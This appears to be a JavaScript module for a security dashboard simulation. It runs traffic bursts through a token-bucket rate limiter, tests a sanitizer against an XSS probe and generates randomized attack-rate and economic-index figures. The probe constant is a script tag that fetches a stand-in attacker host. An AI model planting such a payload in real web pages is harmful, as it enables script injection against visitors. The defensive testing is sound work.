import { MAX_SERIES_POINTS } from "../config/constants.js";
import { sanitizeString } from "../security/sanitize.js";

const XSS_PROBE = "<script>fetch('http://evil.tld')</script>";
const MAX_SAMPLED_REQUESTS = 120;
const DDOS_BURST = 950;

export function isXssNeutralized(payload) {
  const sanitized = sanitizeString(payload);
  return !/[<>]/.test(sanitized);
}

/**
 * Simula um ciclo de tráfego: amostra até 120 requisições pelo Token Bucket
 * e descarta o excedente da rajada.
 */
export function simulateTrafficCycle(limiter, ddosSimulation, random = Math.random) {
  const incoming = ddosSimulation ? DDOS_BURST : Math.floor(25 + random() * 35);
  const sampled = Math.min(incoming, MAX_SAMPLED_REQUESTS);
  let accepted = 0;
  let dropped = incoming - sampled;
  let xssBlocked = 0;

  for (let i = 0; i < sampled; i++) {
    if (ddosSimulation && i % 9 === 0 && isXssNeutralized(XSS_PROBE)) {
      xssBlocked += 1;
    }
    if (limiter.consume(1)) accepted += 1;
    else dropped += 1;
  }

  return { incoming, accepted, dropped, xssBlocked };
}

const clamp = (value, min, max) => Math.max(min, Math.min(max, value));

/** Adiciona um ponto à série mantendo um buffer circular de tamanho fixo. */
export function appendTimeSeriesPoint(
  series,
  { ddosSimulation, label, random = Math.random },
) {
  const lastEcon = series.at(-1)?.economicIndex ?? 106.0;
  const nextEcon = Number(
    clamp(lastEcon + (random() - 0.46) * 0.8, 92, 135).toFixed(2),
  );
  const nextAttacks = ddosSimulation
    ? Math.floor(1850 + random() * 450)
    : Math.floor(310 + random() * 260);

  const point = {
    time: label,
    economicIndex: nextEcon,
    cyberAttacksPerMin: nextAttacks,
    mitigatedRate: ddosSimulation ? 99.94 : 99.89,
  };
  return [...series.slice(-(MAX_SERIES_POINTS - 1)), point];
}
